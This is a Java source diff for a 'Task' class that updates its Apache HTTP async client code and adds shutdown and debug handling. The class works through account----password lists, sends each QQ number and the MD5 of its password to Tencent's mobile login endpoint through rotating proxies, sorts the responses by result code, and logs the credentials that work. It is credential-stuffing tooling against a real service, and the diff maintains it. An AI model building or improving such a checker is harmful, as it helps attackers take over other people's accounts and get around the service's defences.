@@ -7,12 +7,11 @@ import java.util.Random;
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpHost;
 import org.apache.http.HttpResponse;
+import org.apache.http.client.config.RequestConfig;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.concurrent.FutureCallback;
-import org.apache.http.conn.params.ConnRouteParams;
-import org.apache.http.impl.nio.client.DefaultHttpAsyncClient;
-import org.apache.http.nio.client.HttpAsyncClient;
-import org.apache.http.params.CoreConnectionPNames;
+import org.apache.http.impl.nio.client.CloseableHttpAsyncClient;
+import org.apache.http.impl.nio.client.HttpAsyncClients;
 import org.apache.http.util.EntityUtils;
 
 import ws.hoyland.util.Configuration;
@@ -27,7 +26,7 @@ public class Task implements Runnable, Observer {
 	private String password = null;
 	private String line;
 	
-	private DefaultHttpAsyncClient client = null;
+	private CloseableHttpAsyncClient client = null;
 	private HttpGet request = null; 
 	private EngineMessage message = null;	
 	private HttpHost proxy = null;
@@ -46,9 +45,9 @@ public class Task implements Runnable, Observer {
 		this.line = line;
 		
 		String[] ls = line.split("----");
-		this.id = Integer.parseInt(ls[1]);
-		this.account = ls[2];
-		this.password = ls[3];
+		this.id = Integer.parseInt(ls[0]);
+		this.account = ls[1];
+		this.password = ls[2];
 		
 		this.run = true;
 	}
@@ -62,11 +61,20 @@ public class Task implements Runnable, Observer {
 			switch(type){
 				case EngineMessageType.OM_REQUIRE_PROXY:
 					if(msg.getData()!=null){
-						String[] ms = (String[]) msg.getData();
+						String[] ms = ((String) msg.getData()).split(":");
 						//System.err.println(ms[0] + "/" + ms[1] + "/" + ms[2]);
-						this.proxy = new HttpHost(ms[0], Integer.parseInt(ms[1]));;
+						this.proxy = new HttpHost(ms[0], Integer.parseInt(ms[1]));
+						//System.out.println("PROXYDF:"+proxy);
+						
 					}else {
 						this.run = false;
+					}
+					break;
+				case EngineMessageType.OM_SHUTDOWN:
+					this.run = false;
+					if(request!=null){
+						request.abort();
+						request.releaseConnection();
 					}
 					break;
 				default:
@@ -76,7 +84,6 @@ public class Task implements Runnable, Observer {
 		
 	}
 	
-	@SuppressWarnings("deprecation")
 	@Override
 	public void run() {
 		synchronized(SyncUtil.START_OBJECT){	
@@ -88,11 +95,6 @@ public class Task implements Runnable, Observer {
 		}
 		
 		try{
-			client = new DefaultHttpAsyncClient();
-			client.getParams().setParameter(
-					CoreConnectionPNames.CONNECTION_TIMEOUT, 1000*Integer.parseInt(CONFIGURATION.getProperty("TIMEOUT")));
-			client.getParams().setParameter(CoreConnectionPNames.SO_TIMEOUT, 1000*Integer.parseInt(CONFIGURATION.getProperty("TIMEOUT")));
-			
 			message = new EngineMessage();
 			message.setTid(this.id);
 			message.setType(EngineMessageType.IM_REQUIRE_PROXY);
@@ -102,44 +104,65 @@ public class Task implements Runnable, Observer {
 				throw new Exception("No Proxy!");
 			}
 			
-			client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY, proxy);
-
+			RequestConfig requestConfig = RequestConfig.custom()
+		            .setSocketTimeout(1000*Integer.parseInt(CONFIGURATION.getProperty("TIMEOUT")))
+		            .setConnectTimeout(1000*Integer.parseInt(CONFIGURATION.getProperty("TIMEOUT"))).build();
+			
+			client = HttpAsyncClients.custom()
+		            .setDefaultRequestConfig(requestConfig)
+		            .setProxy(proxy)
+		            .build();
+			client.start();
+			
 			String url = "http://pt.3g.qq.com/login?act=json&format=2&bid_code=house_touch&r=" + String.valueOf(RND.nextDouble()) + "&qq=" + account + "&pmd5=" + Converts.bytesToHexString(Converts.MD5Encode(password)) + "&go_url=http%3A%2F%2Fhouse60.3g.qq.com%2Ftouch%2Findex.jsp%3Fsid%3DAd_JZ1k2ZviFLkV2nvFt7005%26g_ut%3D3%26g_f%3D15124";
 			//url = url.replaceAll("#", String.valueOf(RND.nextDouble()));			
 			request = new HttpGet(url);
 			request.setHeader("User-Agent", UAG);
 			
+			try{
+				Thread.sleep(200);
+			}catch(Exception e){
+				return;
+			}
 			client.execute(request, new FutureCallback<HttpResponse>() {
                 public void completed(final HttpResponse response) {
+                	if(!run){
+                		release();
+                		return;
+                	}
+                	
                     //System.out.println(request.getRequestLine() + "->" + response.getStatusLine());
                 	HttpEntity entity = null;
                 	try{
 	                	entity = response.getEntity();
-	                	String line = EntityUtils.toString(entity);
+	                	String resp = EntityUtils.toString(entity);
 	                	
-	                    if (line.indexOf("pt.handleLoginResult") == -1)//代理异常
+	                	System.out.println("A1");
+	                    if (resp.indexOf("pt.handleLoginResult") == -1)//代理异常
 	                    {
+	                    	System.out.println("A2");
 	                        Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
 	                    }
 	                    else
 	                    {
+	                    	System.out.println("A3");
 	                        //bool ok = false;
-	                        if (line.indexOf("," + account + ",0,") != -1)
+	                        if (resp.indexOf("," + account + ",0,") != -1)
 	                        {
 	                        	Engine.getInstance().log(0, account + "----" + password);//account + " / " + proxy
 	                            //task.Abort();
 	                        }
-	                        else if (line.indexOf(",0,40010,") != -1)
+	                        else if (resp.indexOf(",0,40010,") != -1)
 	                        {
 	                        	Engine.getInstance().log(1, account + "----" + password);
 	                            //task.Abort();
 	                        }
-	                        else if (line.indexOf(",0,40026,") != -1)
+	                        else if (resp.indexOf(",0,40026,") != -1)
 	                        {
 	                        	Engine.getInstance().log(2, account + "----" + password);
 	                            //task.Abort();
 	                        }
-	                        else if (line.indexOf("," + account + ",0,") != -1)//验证码
+	                        else if (resp.indexOf("," + account + ",0,") != -1)//验证码
 	                        {
 	                        	Engine.getInstance().addTask(line);
 
@@ -148,6 +171,8 @@ public class Task implements Runnable, Observer {
 	                        }
 	                        else //代理异常
 	                        {
+	                        	System.out.println("A4");
+	                        	//System.out.println("proxy="+proxy);
 	                            Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
 	                        }
 	                    }
@@ -168,25 +193,33 @@ public class Task implements Runnable, Observer {
                 }
 
                 public void failed(final Exception ex) {
-                    ex.printStackTrace();
+                    //ex.printStackTrace();
+//                	System.out.println("B");
                     release();
+                    Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
                 }
 
                 public void cancelled() {
+//                	System.out.println("C");
                 	release();
                 }
                 
                 private void release(){
                 	try{
+//                		System.out.println("D1");
 	                	if (request != null) {
+//	                		System.out.println("D2");
+	                		request.abort();
 	        				request.releaseConnection();
 	        			}
                 	}catch(Exception e){
             			e.printStackTrace();
             		}
                 	try{
+//                		System.out.println("E1");
 	        			if(client!=null){
-	        				client.shutdown();
+//	        				System.out.println("E2");
+	        				client.close();
 	        			}
                 	}catch(Exception e){
             			e.printStackTrace();
